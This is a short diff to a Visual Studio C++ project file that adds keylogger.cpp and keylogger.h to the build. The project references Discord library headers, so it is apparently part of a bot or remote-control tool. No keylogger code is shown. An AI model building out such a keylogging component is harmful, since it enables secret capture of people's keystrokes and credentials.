@@ -181,6 +181,7 @@
   </ItemDefinitionGroup>
   <ItemGroup>
     <ClCompile Include="filesystem.cpp" />
+    <ClCompile Include="keylogger.cpp" />
     <ClCompile Include="main.cpp" />
     <ClCompile Include="tasks.cpp" />
   </ItemGroup>
@@ -228,6 +229,7 @@
     <ClInclude Include="dependencies\include\dpp-10.0\dpp\wsclient.h" />
     <ClInclude Include="filesystem.h" />
     <ClInclude Include="helper.h" />
+    <ClInclude Include="keylogger.h" />
     <ClInclude Include="tasks.h" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
